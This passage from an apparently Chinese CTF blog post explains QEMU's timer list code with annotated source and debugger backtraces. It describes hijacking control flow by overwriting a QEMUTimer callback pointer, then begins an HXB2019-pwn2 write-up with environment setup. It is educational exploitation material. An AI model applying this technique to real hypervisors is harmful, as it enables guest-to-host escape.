class="line">        pt = &amp;t-&gt;next;  <span class="comment">// 继续向后</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 规范化到期时间：活动定时器必须是非负值（-1 表示未安排/不在队列） */</span></span><br><span class="line">    ts-&gt;expire_time = MAX(expire_time, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">/* 将 ts 挂到插入点之前（pt 所指向的是“即将成为 ts-&gt;next”的位置） */</span></span><br><span class="line">    ts-&gt;next = *pt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 原子发布：把 ts 写入到前驱的 next（或链表头）。</span></span><br><span class="line"><span class="comment">     * 虽然此处持有互斥锁，但 active_timers 的“快速路径”使用 qatomic_read() 做无锁判空，</span></span><br><span class="line"><span class="comment">     * 使用 qatomic_set() 可以提供所需的发布语义，确保其他核看到 head 变更时，</span></span><br><span class="line"><span class="comment">     * ts-&gt;expire_time / ts-&gt;next 等字段已按顺序可见。 */</span></span><br><span class="line">    qatomic_set(pt, ts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 如果插入点是表头，说明最早到期的定时器发生了变化，需要 rearm */</span></span><br><span class="line">    <span class="keyword">return</span> pt == &amp;timer_list-&gt;active_timers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="QEMUTimerList-回调"><a href="#QEMUTimerList-回调" class="headerlink" title="QEMUTimerList 回调"></a>QEMUTimerList 回调</h3><p><code>QEMUTimerList</code> 的 <code>notify_cb</code> 回调是<strong>唤醒&#x2F;通知事件循环</strong>的回调，不处理业务。该回调函数的定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">void</span> <span class="title function_">QEMUTimerCB</span><span class="params">(<span class="type">void</span> *opaque)</span>;</span><br></pre></td></tr></table></figure></div>

<p>它的职责是当“<strong>最早到期点</strong>发生变化，或者某条时钟被重新启用”时，<strong>打断 poll&#x2F;epoll 睡眠</strong>并触发<strong>重新计算 deadline</strong>。如果未设置 <code>notify_cb</code>，默认走 <code>qemu_notify_event()</code>。</p>
<p>典型触发路径是 <strong>“最早到期点变了 → 需要重置 poll 超时&#x2F;打断睡眠”</strong>。例如当对一个定时器执行 <code>timer_mod*()</code>，且它<strong>成为表头（新的最早到期）</strong>或<strong>从无到有</strong>：<code>timer_mod*()</code> → <code>timer_mod_ns_locked()</code> 插入排序 → 返回需要 rearm → <code>timerlist_rearm()</code> → **<code>timerlist_notify()</code> → <code>notify_cb(opaque)</code>**（若未设置则 <code>qemu_notify_event()</code>）。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#C4A000">qemu_timer_notify_cb</font> (opaque=0x1c1768ab8f0, type=QEMU_CLOCK_REALTIME) at <font color="#4E9A06">../softmmu/cpu-timers.c</font>:243
#1  <font color="#3465A4">0x0000555555e9c62d</font> in <font color="#C4A000">timerlist_notify</font> (timer_list=0x55555691b1e0) at <font color="#4E9A06">../util/qemu-timer.c</font>:300
#2  <font color="#3465A4">0x0000555555e9c9b9</font> in <font color="#C4A000">timerlist_rearm</font> (timer_list=0x55555691b1e0) at <font color="#4E9A06">../util/qemu-timer.c</font>:424
#3  <font color="#3465A4">0x0000555555e9cae2</font> in <font color="#C4A000">timer_mod_ns</font> (ts=0x55555696bfa0, expire_time=895342000368) at <font color="#4E9A06">../util/qemu-timer.c</font>:452
#4  <font color="#3465A4">0x0000555555e9cc28</font> in <font color="#C4A000">timer_mod</font> (ts=0x55555696bfa0, expire_time=895342000368) at <font color="#4E9A06">../util/qemu-timer.c</font>:481
#5  <font color="#3465A4">0x0000555555b918ce</font> in <font color="#C4A000">apic_timer_update</font> (s=0x55555689d800, current_time=893574944608) at <font color="#4E9A06">../hw/intc/apic.c</font>:623
#6  <font color="#3465A4">0x0000555555b91f4d</font> in <font color="#C4A000">apic_mem_write</font> (opaque=0x55555689d800, addr=896, val=110440984, size=4) at <font color="#4E9A06">../hw/intc/apic.c</font>:826
#7  <font color="#3465A4">0x0000555555c08105</font> in <font color="#C4A000">memory_region_write_accessor</font> (mr=0x55555689d890, addr=896, value=0x7ffff504be98, size=4, shift=0, mask=4294967295, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:491
#8  <font color="#3465A4">0x0000555555c0833c</font> in <font color="#C4A000">access_with_adjusted_size</font> (addr=896, value=0x7ffff504be98, size=4, access_size_min=1, access_size_max=4, access_fn=0x555555c08018 &lt;memory_region_write_accessor&gt;, mr=0x55555689d8902
#9  <font color="#3465A4">0x0000555555c0b3ef</font> in <font color="#C4A000">memory_region_dispatch_write</font> (mr=0x55555689d890, addr=896, data=110440984, op=MO_32, attrs=...) at <font color="#4E9A06">../softmmu/memory.c</font>:1501
#10 <font color="#3465A4">0x0000555555bc8b0c</font> in <font color="#C4A000">io_writex</font> (env=0x5555569448d0, iotlbentry=0x7fffa868c1e0, mmu_idx=2, val=110440984, addr=18446744073699054464, retaddr=140736193352078, op=MO_32) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:1378
#11 <font color="#3465A4">0x0000555555bcb3d5</font> in <font color="#C4A000">store_helper</font> (env=0x5555569448d0, addr=18446744073699054464, val=110440984, oi=34, retaddr=140736193352078, op=MO_32) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:2397
#12 <font color="#3465A4">0x0000555555bcb64d</font> in <font color="#C4A000">helper_le_stl_mmu</font> (env=0x5555569448d0, addr=18446744073699054464, val=110440984, oi=34, retaddr=140736193352078) at <font color="#4E9A06">../accel/tcg/cputlb.c</font>:2463
#13 <font color="#3465A4">0x00007fffb2cfd18e</font> in <font color="#C4A000">code_gen_buffer</font> ()
#14 <font color="#3465A4">0x0000555555b95552</font> in <font color="#C4A000">cpu_tb_exec</font> (cpu=0x55555693c070, itb=0x7fffb306c500 &lt;code_gen_buffer+12760275&gt;) at <font color="#4E9A06">../accel/tcg/cpu-exec.c</font>:178
#15 <font color="#3465A4">0x0000555555b96403</font> in <font color="#C4A000">cpu_loop_exec_tb</font> (cpu=0x55555693c070, tb=0x7fffb306c500 &lt;code_gen_buffer+12760275&gt;, last_tb=0x7ffff504c5b8, tb_exit=0x7ffff504c5b0) at <font color="#4E9A06">../accel/tcg/cpu-exec.c</font>:658
#16 <font color="#3465A4">0x0000555555b966fb</font> in <font color="#C4A000">cpu_exec</font> (cpu=0x55555693c070) at <font color="#4E9A06">../accel/tcg/cpu-exec.c</font>:771
#17 <font color="#3465A4">0x0000555555bab751</font> in <font color="#C4A000">tcg_cpu_exec</font> (cpu=0x55555693c070) at <font color="#4E9A06">../accel/tcg/tcg-cpus.c</font>:243
#18 <font color="#3465A4">0x0000555555babcc2</font> in <font color="#C4A000">tcg_cpu_thread_fn</font> (arg=0x55555693c070) at <font color="#4E9A06">../accel/tcg/tcg-cpus.c</font>:427
#19 <font color="#3465A4">0x0000555555e77a29</font> in <font color="#C4A000">qemu_thread_start</font> (args=0x55555696b890) at <font color="#4E9A06">../util/qemu-thread-posix.c</font>:521
#20 <font color="#3465A4">0x00007ffff781b609</font> in <font color="#C4A000">start_thread</font> (arg=&lt;optimized out&gt;) at <font color="#4E9A06">pthread_create.c</font>:477
#21 <font color="#3465A4">0x00007ffff773e353</font> in <font color="#C4A000">clone</font> () at <font color="#4E9A06">../sysdeps/unix/sysv/linux/x86_64/clone.S</font>:95</pre>

<p>或者重新启用某条时钟：<code>qemu_clock_enable(type, true)</code> 若从禁用变为启用 → <code>qemu_clock_notify(type)</code> → 遍历该时钟挂着的所有 <code>QEMUTimerList</code> 调 <strong><code>timerlist_notify()</code></strong> → **<code>notify_cb(opaque)</code>**。这种情景没有上一种常见。</p>
<p><code>timerlist_notify</code> 函数定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">timerlist_notify</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (timer_list-&gt;notify_cb) &#123;</span><br><span class="line">        timer_list-&gt;notify_cb(timer_list-&gt;notify_opaque, timer_list-&gt;clock-&gt;type);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        qemu_notify_event();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="QEMUTimer-回调"><a href="#QEMUTimer-回调" class="headerlink" title="QEMUTimer 回调"></a>QEMUTimer 回调</h3><p><code>QEMUTimer</code> 的 <code>cb</code> 回调是定时器<strong>真正的业务回调</strong>。当该定时器到期、且被从 <code>active_timers</code> 链表摘下后，<strong>在释放链表锁</strong>的情况下调用 <code>cb(opaque)</code>。如果需要周期性行为，要在回调里自行 <code>timer_mod*()</code> 重新安排到下一次到期。</p>
<p>在事件循环一轮检查中，<code>timerlist_run_timers()</code> 读取当前时钟时间，<strong>只要表头定时器 <code>expire_time &lt;= now</code> 就触发</strong>：<br>它会先把该定时器<strong>从链表摘下</strong>、将 <code>expire_time</code> 置为 <code>-1</code>，然后在<strong>无锁</strong>状态下调用 **<code>cb(opaque)</code>**。若还有更多已到期的表头，继续循环处理。</p>
<pre><font color="#4E9A06"><b>pwndbg&gt; </b></font>bt
#0  <font color="#3465A4">0x0000555555e9cd99</font> in <font color="#C4A000">timerlist_run_timers</font> (timer_list=0x55555691b1e0) at <font color="#4E9A06">../util/qemu-timer.c</font>:545
#1  <font color="#3465A4">0x0000555555e9cf28</font> in <font color="#C4A000">qemu_clock_run_timers</font> (type=QEMU_CLOCK_VIRTUAL) at <font color="#4E9A06">../util/qemu-timer.c</font>:588
#2  <font color="#3465A4">0x0000555555e9d20a</font> in <font color="#C4A000">qemu_clock_run_all_timers</font> () at <font color="#4E9A06">../util/qemu-timer.c</font>:670
#3  <font color="#3465A4">0x0000555555ea1763</font> in <font color="#C4A000">main_loop_wait</font> (nonblocking=0) at <font color="#4E9A06">../util/main-loop.c</font>:531
#4  <font color="#3465A4">0x0000555555bde240</font> in <font color="#C4A000">qemu_main_loop</font> () at <font color="#4E9A06">../softmmu/vl.c</font>:1678
#5  <font color="#3465A4">0x000055555580e44a</font> in <font color="#C4A000">main</font> (argc=18, argv=0x7fffffffdda8, envp=0x7fffffffde40) at <font color="#4E9A06">../softmmu/main.c</font>:50
#6  <font color="#3465A4">0x00007ffff7643083</font> in <font color="#C4A000">__libc_start_main</font> (main=0x55555580e419 &lt;main&gt;, argc=18, argv=0x7fffffffdda8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdd98) at <font color="#4E9A06">..</font>8
#7  <font color="#3465A4">0x000055555580e35e</font> in <font color="#C4A000">_start</font> ()
</pre>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 依次驱动所有时钟线（REALTIME / VIRTUAL / HOST / VIRTUAL_RT）的定时器。</span></span><br><span class="line"><span class="comment">// 只要任意时钟线有触发过回调，返回 true。</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">qemu_clock_run_all_timers</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> progress = <span class="literal">false</span>;          <span class="comment">// 是否有定时器被触发</span></span><br><span class="line">    QEMUClockType type;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历所有时钟类型</span></span><br><span class="line">    <span class="keyword">for</span> (type = <span class="number">0</span>; type &lt; QEMU_CLOCK_MAX; type++) &#123;</span><br><span class="line">        <span class="comment">// 该时钟是否参与“下一次期限(deadline)”的计算/触发（例如某些模式下可能被禁用）</span></span><br><span class="line">        <span class="keyword">if</span> (qemu_clock_use_for_deadline(type)) &#123;</span><br><span class="line">            <span class="comment">// 布尔“或”累加：只要有一个触发过，最终返回 true</span></span><br><span class="line">            progress |= qemu_clock_run_timers(type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> progress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在主事件循环的 timerlist 上，驱动指定时钟线的定时器。</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">qemu_clock_run_timers</span><span class="params">(QEMUClockType type)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// main_loop_tlg 是主循环持有的四条时钟线对应的 QEMUTimerList*</span></span><br><span class="line">    <span class="keyword">return</span> timerlist_run_timers(main_loop_tlg.tl[type]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理给定 timer_list 上“已到期”的定时器。</span></span><br><span class="line"><span class="comment">// 到期的定时器按顺序取下，释放锁后执行其回调，然后再重新加锁检查下一项。</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">timerlist_run_timers</span><span class="params">(QEMUTimerList *timer_list)</span></span><br><span class="line">&#123;</span><br><span class="line">    QEMUTimer *ts;</span><br><span class="line">    <span class="type">int64_t</span> current_time;</span><br><span class="line">    <span class="type">bool</span> progress = <span class="literal">false</span>;      <span class="comment">// 函数期间是否触发过任何回调</span></span><br><span class="line">    QEMUTimerCB *cb;</span><br><span class="line">    <span class="type">void</span> *opaque;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 无需加锁的快速路径：head 指针为空则直接返回（原子读避免竞态）</span></span><br><span class="line">    <span class="keyword">if</span> (!qatomic_read(&amp;timer_list-&gt;active_timers)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 复位“处理完成”事件；调用结束前会 set()，供其他等待方感知本轮处理已结束</span></span><br><span class="line">    qemu_event_reset(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该时钟线整体被禁用，则不处理</span></span><br><span class="line">    <span class="keyword">if</span> (!timer_list-&gt;clock-&gt;enabled) &#123;</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不同时钟类型在“录制/回放（rr）”模式下的检查点处理</span></span><br><span class="line">    <span class="keyword">switch</span> (timer_list-&gt;clock-&gt;type) &#123;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_REALTIME:</span><br><span class="line">        <span class="comment">// 实时时钟：无需在这里做 checkpoint</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_VIRTUAL:</span><br><span class="line">        <span class="comment">// 纯虚拟时钟：下面循环里对“非 EXTERNAL”定时器按需做 checkpoint</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_HOST:</span><br><span class="line">        <span class="comment">// HOST 时钟进入前做一次 checkpoint，不满足则暂不处理</span></span><br><span class="line">        <span class="keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_HOST)) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> QEMU_CLOCK_VIRTUAL_RT:</span><br><span class="line">        <span class="comment">// VIRTUAL_RT 时钟同理</span></span><br><span class="line">        <span class="keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL_RT)) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 从 active_timers 链表中依次取出“已到期”的定时器并处理。</span></span><br><span class="line"><span class="comment">     * 在 rr 模式下，对 VIRTUAL 时钟需要“筛选式”checkpoint：</span></span><br><span class="line"><span class="comment">     *  - 在处理任何【非 EXTERNAL】定时器之前，必须先记录/回放一次 CHECKPOINT_CLOCK_VIRTUAL；</span></span><br><span class="line"><span class="comment">     *  - 虚拟时钟的时间在这轮处理里不变，因此该 checkpoint 只需做一次；</span></span><br><span class="line"><span class="comment">     *  - 但处理过程中可能会插入新的非 EXTERNAL 定时器，所以在循环里按需触发。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取当前时钟类型的“现在”时间（单位：ns）</span></span><br><span class="line">    current_time = qemu_clock_get_ns(timer_list-&gt;clock-&gt;type);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加锁保护 active_timers 单链表</span></span><br><span class="line">    qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">    <span class="keyword">while</span> ((ts = timer_list-&gt;active_timers)) &#123;</span><br><span class="line">        <span class="comment">// 表头是最早到期的定时器；若表头尚未到期，则后面都不会到期，直接结束</span></span><br><span class="line">        <span class="keyword">if</span> (!timer_expired_ns(ts, current_time)) &#123;</span><br><span class="line">            <span class="comment">/* 若没有任何到期定时器，或者触发的都属于 EXTERNAL，</span></span><br><span class="line"><span class="comment">             * 则可跳过（某些情况下可以不做虚拟时钟的 checkpoint）。*/</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 在 rr 模式下，对 VIRTUAL 时钟上【非 EXTERNAL】的定时器，</span></span><br><span class="line"><span class="comment">         * 必须先通过 CHECKPOINT_CLOCK_VIRTUAL 才能继续处理。</span></span><br><span class="line"><span class="comment">         * 若 checkpoint 尚未就绪（replay_checkpoint 返回 false），</span></span><br><span class="line"><span class="comment">         * 则本轮暂不处理，解锁后直接退出，等待之后再次驱动。 */</span></span><br><span class="line">        <span class="keyword">if</span> (replay_mode != REPLAY_MODE_NONE</span><br><span class="line">            &amp;&amp; timer_list-&gt;clock-&gt;type == QEMU_CLOCK_VIRTUAL</span><br><span class="line">            &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)</span><br><span class="line">            &amp;&amp; !replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) &#123;</span><br><span class="line">            qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">            <span class="keyword">goto</span> out;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在调用回调前，先把该定时器从链表取下并标记为未安排</span></span><br><span class="line">        timer_list-&gt;active_timers = ts-&gt;next;  <span class="comment">// 从头删</span></span><br><span class="line">        ts-&gt;next = <span class="literal">NULL</span>;                       <span class="comment">// 断开单链表指针</span></span><br><span class="line">        ts-&gt;expire_time = <span class="number">-1</span>;                  <span class="comment">// -1 表示未被安排（disarmed）</span></span><br><span class="line">        cb = ts-&gt;cb;                           <span class="comment">// 先保存回调与参数</span></span><br><span class="line">        opaque = ts-&gt;opaque;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重要：回调期间释放锁，允许回调内部重新添加/删除其它定时器</span></span><br><span class="line">        qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line">        cb(opaque);                            <span class="comment">// 执行用户回调</span></span><br><span class="line">        qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">        progress = <span class="literal">true</span>;                       <span class="comment">// 标记本轮有进展</span></span><br><span class="line">    &#125;</span><br><span class="line">    qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="comment">// 标记“本轮处理完成”，唤醒可能等待这一事件的线程</span></span><br><span class="line">    qemu_event_set(&amp;timer_list-&gt;timers_done_ev);</span><br><span class="line">    <span class="keyword">return</span> progress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>因此我们可以通过修改 <code>main_loop_tlg</code> 中指向的 <code>QEMUTimerList</code> 的 <code>active_timers</code> 指向的 <code>QEMUTimer</code>  的 <code>cb</code> 回调函数指针来劫持程序执行流。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/QEMUTimer.svg"
                     
                ></p>
<p>通常 <code>QEMUTimer</code> 的 <code>expire_time</code> 需要设置为 0，否则不满足 <code>timer_head-&gt;expire_time &lt;= current_time</code> 无法调用回调。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">bool</span> <span class="title function_">timer_expired_ns</span><span class="params">(QEMUTimer *timer_head, <span class="type">int64_t</span> current_time)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> timer_head &amp;&amp; (timer_head-&gt;expire_time &lt;= current_time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="HXB2019-pwn2"><a href="#HXB2019-pwn2" class="headerlink" title="HXB2019-pwn2"></a>HXB2019-pwn2</h1><p>虚拟机密码为 <code>root</code></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>缺少 <code>libiscsi.so.2</code>，需要编译相关依赖：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install -y autoconf automake libtool pkg-config gettext \</span><br><span class="line">                    make gcc g++</span><br><span class="line"></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/sahlberg/libiscsi.git</span><br><span class="line"><span class="built_in">cd</span> libiscsi</span><br><span class="line">./autogen.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>

<p>将编译好的 <code>libiscsi.so.11.0.2</code> 替换上去即可。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed  libiscsi.so.2 ./libiscsi.so.11.0.2 qemu-system-x86_64</span><br></pre></td></tr></table></figure></div>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 